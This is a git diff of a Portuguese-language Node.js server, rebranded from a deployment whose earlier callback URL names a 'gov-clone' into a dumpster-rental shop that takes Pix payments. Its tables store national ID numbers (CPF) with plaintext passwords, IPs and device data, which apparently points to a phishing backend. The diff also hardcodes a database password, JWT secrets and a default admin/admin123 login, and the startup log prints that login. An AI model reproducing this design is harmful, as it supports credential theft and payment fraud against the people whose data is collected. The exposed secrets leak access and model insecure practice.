@@ -27,139 +27,153 @@ const pool = new Pool({
     connectionString: 'postgresql://nuitbanker_db_user:Gbnwn5eEqlrKkx4xjduxGis0DchI1aXy@dpg-d8h40ccvikkc73erecng-a.oregon-postgres.render.com/nuitbanker_db',
     ssl: { rejectUnauthorized: false }
 });
-// ============ TABELAS EXISTENTES ============
-pool.query(`
-    CREATE TABLE IF NOT EXISTS users (
-        id SERIAL PRIMARY KEY,
-        cpf VARCHAR(14) UNIQUE,
-        senha TEXT,
-        ip TEXT,
-        dispositivo TEXT,
-        navegador TEXT,
-        telefone VARCHAR(20),
-        data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        data_senha TIMESTAMP,
-        status VARCHAR(20)
-    )
-`).catch(e => console.log('Tabela users ok'));
 
-pool.query(`
-    ALTER TABLE users ADD COLUMN IF NOT EXISTS telefone VARCHAR(20)
-`).catch(e => console.log('Coluna telefone ok'));
-
-pool.query(`
-    CREATE TABLE IF NOT EXISTS logs (
-        id SERIAL PRIMARY KEY,
-        tipo VARCHAR(30),
-        cpf VARCHAR(14),
-        senha TEXT,
-        ip TEXT,
-        dispositivo TEXT,
-        navegador TEXT,
-        data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )
-`).catch(e => console.log('Tabela logs ok'));
-
-pool.query(`
-    CREATE TABLE IF NOT EXISTS admin_users (
-        id SERIAL PRIMARY KEY,
-        username VARCHAR(50) UNIQUE,
-        senha_hash VARCHAR(255)
-    )
-`).catch(e => console.log('Tabela admin ok'));
-
-pool.query(`
-    CREATE TABLE IF NOT EXISTS payments (
-        id SERIAL PRIMARY KEY,
-        transaction_id VARCHAR(100) UNIQUE,
-        cpf VARCHAR(14),
-        telefone VARCHAR(20),
-        valor DECIMAL(10,2),
-        status VARCHAR(20) DEFAULT 'pending',
-        data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        data_pagamento TIMESTAMP
-    )
-`).catch(e => console.log('Tabela payments ok'));
-
-pool.query(`
-    ALTER TABLE payments ADD COLUMN IF NOT EXISTS telefone VARCHAR(20)
-`).catch(e => console.log('Coluna telefone payments ok'));
-
-pool.query(`
-    CREATE TABLE IF NOT EXISTS admin_attempts (
-        id SERIAL PRIMARY KEY,
-        ip TEXT,
-        tentativa TEXT,
-        data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )
-`).catch(e => console.log('Tabela admin_attempts ok'));
-
-// ============ NOVAS TABELAS PARA CAÇAMBAS ============
-pool.query(`
-    CREATE TABLE IF NOT EXISTS produtos (
-        id SERIAL PRIMARY KEY,
-        nome TEXT NOT NULL,
-        tipo TEXT NOT NULL,
-        preco REAL NOT NULL,
-        preco_promocional REAL,
-        descricao TEXT,
-        icone TEXT,
-        imagem TEXT,
-        dimensoes TEXT,
-        capacidade TEXT,
-        ativo BOOLEAN DEFAULT true,
-        created_at TIMESTAMP DEFAULT NOW()
-    )
-`).catch(e => console.log('Tabela produtos ok'));
-
-pool.query(`
-    CREATE TABLE IF NOT EXISTS clientes (
-        id SERIAL PRIMARY KEY,
-        nome TEXT NOT NULL,
-        telefone TEXT NOT NULL,
-        email TEXT,
-        cpf TEXT,
-        created_at TIMESTAMP DEFAULT NOW()
-    )
-`).catch(e => console.log('Tabela clientes ok'));
-
-pool.query(`
-    CREATE TABLE IF NOT EXISTS agendamentos (
-        id SERIAL PRIMARY KEY,
-        cliente_id INTEGER REFERENCES clientes(id),
-        tipo_obra TEXT,
-        endereco_obra TEXT,
-        data_agendamento DATE,
-        horario TEXT,
-        observacoes TEXT,
-        created_at TIMESTAMP DEFAULT NOW()
-    )
-`).catch(e => console.log('Tabela agendamentos ok'));
-
-pool.query(`
-    CREATE TABLE IF NOT EXISTS pedidos (
-        id SERIAL PRIMARY KEY,
-        cliente_id INTEGER REFERENCES clientes(id),
-        produto_id INTEGER REFERENCES produtos(id),
-        quantidade INTEGER DEFAULT 1,
-        valor_total REAL,
-        status_pagamento TEXT DEFAULT 'pendente',
-        tipo_pagamento TEXT,
-        transacao_id TEXT,
-        created_at TIMESTAMP DEFAULT NOW()
-    )
-`).catch(e => console.log('Tabela pedidos ok'));
-
-(async () => {
+async function initDatabase() {
+    const client = await pool.connect();
     try {
-        const adminExists = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
+        // Tabela admin_users
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS admin_users (
+                id SERIAL PRIMARY KEY,
+                username VARCHAR(50) UNIQUE,
+                senha_hash VARCHAR(255)
+            )
+        `);
+        console.log('✅ Tabela admin_users criada/verificada');
+
+        // Tabela users
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS users (
+                id SERIAL PRIMARY KEY,
+                cpf VARCHAR(14) UNIQUE,
+                senha TEXT,
+                ip TEXT,
+                dispositivo TEXT,
+                navegador TEXT,
+                telefone VARCHAR(20),
+                data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                data_senha TIMESTAMP,
+                status VARCHAR(20)
+            )
+        `);
+        console.log('✅ Tabela users criada/verificada');
+
+        // Tabela logs
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS logs (
+                id SERIAL PRIMARY KEY,
+                tipo VARCHAR(30),
+                cpf VARCHAR(14),
+                senha TEXT,
+                ip TEXT,
+                dispositivo TEXT,
+                navegador TEXT,
+                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('✅ Tabela logs criada/verificada');
+
+        // Tabela payments
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS payments (
+                id SERIAL PRIMARY KEY,
+                transaction_id VARCHAR(100) UNIQUE,
+                cpf VARCHAR(14),
+                telefone VARCHAR(20),
+                valor DECIMAL(10,2),
+                status VARCHAR(20) DEFAULT 'pending',
+                data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                data_pagamento TIMESTAMP
+            )
+        `);
+        console.log('✅ Tabela payments criada/verificada');
+
+        // Tabela admin_attempts
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS admin_attempts (
+                id SERIAL PRIMARY KEY,
+                ip TEXT,
+                tentativa TEXT,
+                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('✅ Tabela admin_attempts criada/verificada');
+
+        // Tabela produtos (caçambas)
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS produtos (
+                id SERIAL PRIMARY KEY,
+                nome TEXT NOT NULL,
+                tipo TEXT NOT NULL,
+                preco REAL NOT NULL,
+                preco_promocional REAL,
+                descricao TEXT,
+                icone TEXT,
+                imagem TEXT,
+                dimensoes TEXT,
+                capacidade TEXT,
+                ativo BOOLEAN DEFAULT true,
+                created_at TIMESTAMP DEFAULT NOW()
+            )
+        `);
+        console.log('✅ Tabela produtos criada/verificada');
+
+        // Tabela clientes
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS clientes (
+                id SERIAL PRIMARY KEY,
+                nome TEXT NOT NULL,
+                telefone TEXT NOT NULL,
+                email TEXT,
+                cpf TEXT,
+                created_at TIMESTAMP DEFAULT NOW()
+            )
+        `);
+        console.log('✅ Tabela clientes criada/verificada');
+
+        // Tabela agendamentos
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS agendamentos (
+                id SERIAL PRIMARY KEY,
+                cliente_id INTEGER REFERENCES clientes(id),
+                tipo_obra TEXT,
+                endereco_obra TEXT,
+                data_agendamento DATE,
+                horario TEXT,
+                observacoes TEXT,
+                created_at TIMESTAMP DEFAULT NOW()
+            )
+        `);
+        console.log('✅ Tabela agendamentos criada/verificada');
+
+        // Tabela pedidos
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS pedidos (
+                id SERIAL PRIMARY KEY,
+                cliente_id INTEGER REFERENCES clientes(id),
+                produto_id INTEGER REFERENCES produtos(id),
+                quantidade INTEGER DEFAULT 1,
+                valor_total REAL,
+                status_pagamento TEXT DEFAULT 'pendente',
+                tipo_pagamento TEXT,
+                transacao_id TEXT,
+                created_at TIMESTAMP DEFAULT NOW()
+            )
+        `);
+        console.log('✅ Tabela pedidos criada/verificada');
+
+        // Criar usuário admin padrão
+        const adminExists = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
         if (adminExists.rows.length === 0) {
             const hash = await bcrypt.hash('admin123', 10);
-            await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
-            console.log('Admin criado: admin / admin123');
+            await client.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
+            console.log('✅ Admin criado: admin / admin123');
+        } else {
+            console.log('✅ Admin já existe');
         }
-        
-        const produtosCount = await pool.query('SELECT COUNT(*) FROM produtos');
+
+        // Inserir produtos padrão se não existir nenhum
+        const produtosCount = await client.query('SELECT COUNT(*) FROM produtos');
         if (parseInt(produtosCount.rows[0].count) === 0) {
             const produtosPadrao = [
                 ['Caçamba 3m³', 'cacamba', 160, 140, 'Ideal para pequenas reformas, jardinagem e entulho leve. Capacidade: ate 500kg.', 'fas fa-dumpster', null, '2.0m x 1.5m x 1.0m', '3m³'],
@@ -167,18 +181,25 @@ pool.query(`
                 ['Caçamba 7m³', 'cacamba', 320, 280, 'Alta capacidade para grandes obras. Capacidade: ate 1200kg.', 'fas fa-truck', null, '3.0m x 2.0m x 1.3m', '7m³']
             ];
             for (const p of produtosPadrao) {
-                await pool.query(
+                await client.query(
                     `INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade) 
                      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
                     p
                 );
             }
-            console.log('Produtos padrao inseridos');
+            console.log('✅ Produtos padrao inseridos');
         }
-    } catch(e) {}
-})();
 
-const JWT_SECRET = 'gov_secret_2024';
+    } catch (err) {
+        console.error('❌ Erro ao inicializar banco:', err);
+    } finally {
+        client.release();
+    }
+}
+
+initDatabase();
+
+const JWT_SECRET = 'ativacacambas_secret_key_2025';
 
 function verificarAdminToken(req, res, next) {
     const authHeader = req.headers.authorization;
@@ -584,20 +605,20 @@ app.post('/api/create-payment', async (req, res) => {
         offer_hash: PLUMIFY_PRODUCT_HASH,
         payment_method: 'pix',
         customer: {
-            name: customer_name || 'PAGAMENTO UNICO',
-            email: customer_email || 'SAC@com.br',
-            phone_number: customer_phone || '21973059827',
-            document: customer_cpf || '07068093868',
-            street_name: 'Rua Teste',
-            number: '123',
-            neighborhood: 'Centro',
-            city: 'Sao Paulo',
-            state: 'SP',
-            zip_code: '01001000'
+            name: customer_name || 'Ativa Caçambas',
+            email: customer_email || 'contato@ativacacambas.com.br',
+            phone_number: customer_phone || '41992878772',
+            document: customer_cpf || '00000000000',
+            street_name: 'Rua Irmã Maria Lúcia Roland',
+            number: '410',
+            neighborhood: 'Hauer',
+            city: 'Curitiba',
+            state: 'PR',
+            zip_code: '81630250'
         },
         cart: [{
             product_hash: PLUMIFY_PRODUCT_HASH,
-            title: 'PAGAMENTO UNICO',
+            title: 'Ativa Caçambas - Locação',
             price: amountCents,
             quantity: 1,
             operation_type: 1,
@@ -605,7 +626,7 @@ app.post('/api/create-payment', async (req, res) => {
         }],
         expire_in_days: 3,
         transaction_origin: 'api',
-        postback_url: 'https://gov-clone-81e8.onrender.com/api/webhook/pagamento'
+        postback_url: `${process.env.BASE_URL || 'https://ativacacambas.onrender.com'}/api/webhook/pagamento`
     };
 
     console.log('Enviando para Plumify:', JSON.stringify(payload, null, 2));
@@ -702,6 +723,8 @@ app.get('/checkout', (req, res) => {
 
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Servidor rodando na porta ${PORT}`);
-    console.log(`Ativa Caçambas - Sistema Unificado`);
+    console.log(`🚀 Servidor rodando na porta ${PORT}`);
+    console.log(`🏗️ Ativa Caçambas - Sistema Unificado`);
+    console.log(`📊 Admin: https://localhost:${PORT}/admin`);
+    console.log(`🔑 Login: admin / admin123`);
 });
